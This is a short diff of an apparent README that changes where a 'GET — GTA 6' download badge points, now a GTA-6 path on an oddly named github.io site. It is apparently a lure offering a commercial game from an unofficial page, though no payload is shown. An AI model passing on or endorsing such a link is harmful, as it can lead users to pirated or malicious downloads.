@@ -4,7 +4,7 @@
 <img src="https://www.play3.de/wp-content/uploads/2026/08/GTA-6-Premiere-1200x675.jpg" width="780">
 </p>
 
-[![GET — GTA 6](https://img.shields.io/badge/GET-GTA%206-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/)
+[![GET — GTA 6](https://img.shields.io/badge/GET-GTA%206-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/GTA-6)
 
 ---
 
